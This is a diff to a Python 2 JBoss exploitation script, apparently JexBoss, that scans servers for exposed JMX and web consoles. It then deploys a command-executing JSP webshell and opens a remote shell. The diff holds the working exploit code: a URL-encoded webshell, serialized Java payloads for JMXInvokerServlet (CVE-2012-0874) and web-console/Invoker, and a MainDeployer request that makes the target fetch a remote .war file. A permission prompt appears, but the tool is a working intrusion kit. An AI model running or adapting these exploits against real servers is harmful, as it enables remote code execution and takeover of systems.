@@ -44,7 +44,9 @@ def getConnection(url):
 		return httplib.HTTPConnection(getHost(url), getPort(url))
 
 def checkVul(url):
+	
 	print ( GREEN +" ** Checking Host: %s **\n" %url )
+	
 	path = { "jmx-console"		 : "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
 			 "web-console" 		 : "/web-console/ServerInfo.jsp",
 			 "JMXInvokerServlet" : "/invoker/JMXInvokerServlet"}
@@ -56,7 +58,6 @@ def checkVul(url):
 			conn.request("HEAD", path[i])
 			path[i] = conn.getresponse().status
 			if path[i] == 200 or path[i] == 500:
-				path[i] = 200
 				print RED + "[ VULNERABLE ]" + ENDC
 			else: print GREEN + "[ OK ]"
 			conn.close()
@@ -72,24 +73,24 @@ def autoExploit(url, type):
 				   "   (OBS: exploit developed and tested for versions <= 6.1.0.Final)" %url)
 	result = 505
 	if type == "jmx-console":
-		result = exploitJmxConsole(url)
+		result = exploitJmxConsoleFileRepository(url)
 		if result != 200 and result != 500:
-			result = exploitMainDeploy(url)
+			result = exploitJmxConsoleMainDeploy(url)
+	elif type == "web-console":
+		result = exploitWebConsoleInvoker(url)
 	elif type == "JMXInvokerServlet":
 		result = exploitInvokerJMX(url)
-	elif type == "admin-console":
-		result = exploitAdminConsole(url)
-	
+
 	if result == 200 or result == 500:
 		print GREEN + " * Successfully deployed code! Starting command shell, wait...\n" + ENDC
 		shell_http(url, type)
 	else:
 		print (RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" 
-				    "   Waiting for 5 seconds...\n "+ ENDC)
-		time.sleep(5)
+				    "   Waiting for 7 seconds...\n "+ ENDC)
+		time.sleep(7)
 
 def shell_http(url, type):
-	if type == "jmx-console":
+	if type == "jmx-console" or type == "web-console":
 		path = '/jbossass/jbossass.jsp?'
 	elif type == "JMXInvokerServlet":
 		path = '/shellinvoker/shellinvoker.jsp?'
@@ -102,7 +103,7 @@ def shell_http(url, type):
 	#clear()
 	print " * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * \n"
 	print RED+" * "+url+": \n"+ENDC
-	headers = {"User-Agent" : "joaomatosf"}
+	headers = {"User-Agent" : "jexboss"}
 	for cmd in ['uname -a', 'cat /etc/issue', 'id']:
 		conn = getConnection(url)
 		cmd = urlencode({"ppp": cmd})
@@ -130,38 +131,46 @@ def shell_http(url, type):
 		else: print stdout,
 		conn.close()
 
-def exploitMainDeploy(url):
+def exploitJmxConsoleMainDeploy(url):
+	# shell in link
+	# /jmx-console/HtmlAdaptor
+	jsp = "http://github.com/joaomatosf/jexboss/blob/master/util/jbossass.war"
 	payload =(  "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service"
-				"=MainDeployer&methodIndex=19&arg0=http://joaomatosf.com/rnp/jbossass.war")
+				"=MainDeployer&methodIndex=19&arg0="+jsp)
 	print ( GREEN+ " * Info: Essa exploração tentará forçar o servidor a implantar o webshell"
-			       "\n   hospedado no link http://www.joaomatosf.com/rnp/jbossass.war. ..." +ENDC)
+			       "\n   hospedado no link: "+jsp +ENDC)
 	conn = getConnection(url)
 	conn.request("HEAD", payload)
 	result = conn.getresponse().status
 	conn.close()
 	return result	
 
-def exploitJmxConsole(url):
+def exploitJmxConsoleFileRepository(url):
+		# shell jsp
+		# /jmx-console/HtmlAdaptor
+		jsp =("%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61"
+			  "%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%22%25%3E%3C"
+			  "%70%72%65%3E%3C%25%20%69%66%20%28%72%65%71%75%65%73%74%2E%67%65"
+			  "%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%21%3D%20"
+			  "%6E%75%6C%6C%20%26%26%20%72%65%71%75%65%73%74%2E%67%65%74%48%65"
+			  "%61%64%65%72%28%22%75%73%65%72%2D%61%67%65%6E%74%22%29%2E%65%71"
+			  "%75%61%6C%73%28%22%6A%65%78%62%6F%73%73%22%29%29%20%7B%20%50%72"
+			  "%6F%63%65%73%73%20%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65%74"
+			  "%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%72%65%71%75%65%73"
+			  "%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29"
+			  "%29%3B%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%20%64%69"
+			  "%73%20%3D%20%6E%65%77%20%44%61%74%61%49%6E%70%75%74%53%74%72%65"
+			  "%61%6D%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29"
+			  "%29%3B%20%53%74%72%69%6E%67%20%64%69%73%72%20%3D%20%64%69%73%2E"
+			  "%72%65%61%64%4C%69%6E%65%28%29%3B%20%77%68%69%6C%65%20%28%20%64"
+			  "%69%73%72%20%21%3D%20%6E%75%6C%6C%20%29%20%7B%20%6F%75%74%2E%70"
+			  "%72%69%6E%74%6C%6E%28%64%69%73%72%29%3B%20%64%69%73%72%20%3D%20"
+			  "%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%7D%20%7D%25%3E" )
+			  
 		payload =("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="
 		           "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="
 		           "jbossass.war&argType=java.lang.String&arg1=jbossass&argType=java.lang.St"
-		           "ring&arg2=.jsp&argType=java.lang.String&arg3=%3C%25%40%20%70%61%67%65%20"
-		           "%69%6D%70%6F%72%74%3D%22%6A%61%76%61%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61"
-		           "%2E%69%6F%2E%2A%22%25%3E%3C%70%72%65%3E%3C%25%20%69%66%20%28%72%65%71%75%"
-		           "65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%2"
-		           "1%3D%20%6E%75%6C%6C%20%26%26%20%72%65%71%75%65%73%74%2E%67%65%74%48%65%61"
-		           "%64%65%72%28%22%75%73%65%72%2D%61%67%65%6E%74%22%29%2E%65%71%75%61%6C%73%"
-		           "28%22%6A%6F%61%6F%6D%61%74%6F%73%66%22%29%29%20%7B%20%50%72%6F%63%65%73%7"
-		           "3%20%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28"
-		           "%29%2E%65%78%65%63%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%"
-		           "74%65%72%28%22%70%70%70%22%29%29%3B%20%44%61%74%61%49%6E%70%75%74%53%74%7"
-		           "2%65%61%6D%20%64%69%73%20%3D%20%6E%65%77%20%44%61%74%61%49%6E%70%75%74%53"
-		           "%74%72%65%61%6D%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%"
-		           "29%3B%20%53%74%72%69%6E%67%20%64%69%73%72%20%3D%20%64%69%73%2E%72%65%61%6"
-		           "4%4C%69%6E%65%28%29%3B%20%77%68%69%6C%65%20%28%20%64%69%73%72%20%21%3D%20"
-		           "%6E%75%6C%6C%20%29%20%7B%20%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%64%69%73%"
-		           "72%29%3B%20%64%69%73%72%20%3D%20%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%2"
-		           "9%3B%20%7D%20%7D%25%3E&argType=boolean&arg4=True")
+		           "ring&arg2=.jsp&argType=java.lang.String&arg3="+jsp+"&argType=boolean&arg4=True")
 		
 		conn = getConnection(url)
 		conn.request("HEAD", payload)
@@ -169,9 +178,10 @@ def exploitJmxConsole(url):
 		conn.close()
 		return result
 		
-		
 def exploitInvokerJMX(url):
 	# CVE-2012-0874
+	# MainDeploy, shell in data
+	# /invoker/JMXInvokerServlet
 	payload = ( "\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73"
 				"\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72"
 				"\x73\x68\x61\x6c\x6c\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f"
@@ -205,10 +215,10 @@ def exploitInvokerJMX(url):
 				"\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x20\x21\x3d\x20\x6e\x75"
 				"\x6c\x6c\x20\x26\x26\x20\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65"
 				"\x74\x48\x65\x61\x64\x65\x72\x28\x22\x75\x73\x65\x72\x2d\x61\x67"
-				"\x65\x6e\x74\x22\x29\x2e\x65\x71\x75\x61\x6c\x73\x28\x22\x6a\x6f"
-				"\x61\x6f\x6d\x61\x74\x6f\x73\x66\x22\x29\x20\x29\x20\x7b\x20\x50"
-				"\x72\x6f\x63\x65\x73\x73\x20\x70\x20\x3d\x20\x52\x75\x6e\x74\x69"
-				"\x6d\x65\x2e\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x28\x29\x2e"
+				"\x65\x6e\x74\x22\x29\x2e\x65\x71\x75\x61\x6c\x73\x28\x22\x6a\x65"
+				"\x78\x62\x6f\x73\x73\x22\x29\x20\x29\x20\x7b\x20\x50\x72\x6f\x63"
+				"\x65\x73\x73\x20\x70\x20\x3d\x20\x52\x75\x6e\x74\x69\x6d\x65\x2e"
+				"\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x28\x29\x2e"
 				"\x65\x78\x65\x63\x28\x72\x65\x71\x75\x65\x73\x74\x2e\x67\x65\x74"
 				"\x50\x61\x72\x61\x6d\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29"
 				"\x29\x3b\x20\x44\x61\x74\x61\x49\x6e\x70\x75\x74\x53\x74\x72\x65"
@@ -252,6 +262,56 @@ def exploitInvokerJMX(url):
 	conn.close
 	return result
 	
+def exploitWebConsoleInvoker(url):
+	# MainDeploy, shell in link
+	# /admin-console/Invoker
+	jsp = "http://github.com/joaomatosf/jexboss/blob/master/util/jbossass.war"
+	jsp = "\\x".join("{:02x}".format(ord(c)) for c in jsp)
+	payload = ( "\xac\xed\x00\x05\x73\x72\x00\x2e\x6f\x72\x67\x2e"
+				"\x6a\x62\x6f\x73\x73\x2e\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x72\x65"
+				"\x6d\x6f\x74\x65\x2e\x52\x65\x6d\x6f\x74\x65\x4d\x42\x65\x61\x6e"
+				"\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\xe0\x4f\xa3\x7a\x74\xae"
+				"\x8d\xfa\x02\x00\x04\x4c\x00\x0a\x61\x63\x74\x69\x6f\x6e\x4e\x61"
+				"\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f"
+				"\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x06\x70\x61\x72\x61\x6d\x73"
+				"\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f"
+				"\x62\x6a\x65\x63\x74\x3b\x5b\x00\x09\x73\x69\x67\x6e\x61\x74\x75"
+				"\x72\x65\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67"
+				"\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x10\x74\x61\x72\x67\x65"
+				"\x74\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x74\x00\x1d\x4c\x6a"
+				"\x61\x76\x61\x78\x2f\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2f"
+				"\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x3b\x78\x70\x74\x00\x06"
+				"\x64\x65\x70\x6c\x6f\x79\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61"
+				"\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58"
+				"\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00"
+				"\x2a\x" +jsp+ "\x75\x72\x00\x13\x5b"
+				"\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e"
+				"\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x00"
+				"\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e"
+				"\x53\x74\x72\x69\x6e\x67\x73\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e"
+				"\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63"
+				"\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00"
+				"\x78\x70\x74\x00\x21\x6a\x62\x6f\x73\x73\x2e\x73\x79\x73\x74\x65"
+				"\x6d\x3a\x73\x65\x72\x76\x69\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65"
+				"\x70\x6c\x6f\x79\x65\x72\x78")
+	conn = getConnection(url)
+	headers = { "Content-Type" : "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
+				"Accept"  : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"}
+	conn.request("POST", "/web-console/Invoker", payload, headers)
+	response = conn.getresponse()
+	result = response.status
+	if result == 401:
+		print "   Retrying..."
+		conn.close()
+		conn.request("HEAD", "/web-console/Invoker", payload, headers)
+		response = conn.getresponse()
+		result = response.status
+	if response.read().count("Failed") > 0:
+		result = 505
+	conn.close
+	return result
+
+	
 def clear():
 	if os.name == 'posix':
 		os.system('clear')
@@ -279,32 +339,38 @@ def banner():
               " #______________________________________________________#\n\n" )
 
 banner()
+# check python version
 if sys.version_info[0] == 3:
 	print (RED + "\n * Not compatible with version 3 of python.\n"
 				  "   Please run it with version 2.7 or lower.\n\n"
 			+BLUE+" * Example:\n"
 				  "   python2.7 " + sys.argv[0]+ " https://site.com\n\n"+ENDC )
 	sys.exit(1)
+
+# check Args
 status, message = checkArgs(sys.argv)
 if status == 0:
 	url = sys.argv[1]
-	mapResult = checkVul(url)
 elif status == 1:
 	print RED + "\n * Error: %s" %message
 	print BLUE + "\n Example:\n python %s https://mdigital.tjpb.jus.br\n" %sys.argv[0] + ENDC
 	sys.exit(status)
 elif status == 2:
 	url = ''.join(['http://',sys.argv[1]])
-	mapResult = checkVul(url)
 
-for i in ["jmx-console", "JMXInvokerServlet"]:
-	if mapResult[i] == 200:
+# check vulnerabilities
+mapResult = checkVul(url)
+
+# performs exploitation
+for i in ["jmx-console", "web-console", "JMXInvokerServlet"]:
+	if mapResult[i] == 200 or mapResult[i] == 500:
 		print BLUE + ("\n * Do you want to try to run an automated exploitation via \""+BOLD+i+NORMAL+"\" ?\n"
 			   	      "   This operation will provide a simple command shell to execute commands on the server..\n"
 			   	 +RED+"   Continue only if you have permission!" +ENDC)
 		if raw_input("   yes/NO ? ").lower() == "yes":
 			autoExploit(url, i)
 
+# resume results
 if mapResult.values().count(200) > 0:
 	banner()
 	print RED+ "\n Results: potentially compromised server!" +ENDC
@@ -325,7 +391,8 @@ if mapResult.values().count(200) > 0:
 elif mapResult.values().count(505) == 0:
 	print ( GREEN+ "\n\n * Results: \n"
 			"   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
-			
+
+# infos	
 print (ENDC+"\n * Info: review, suggestions, updates, etc: \n"
 			 "   https://github.com/joaomatosf/jexboss\n"
 			 "   joaomatosf@gmail.com\n\n\n")
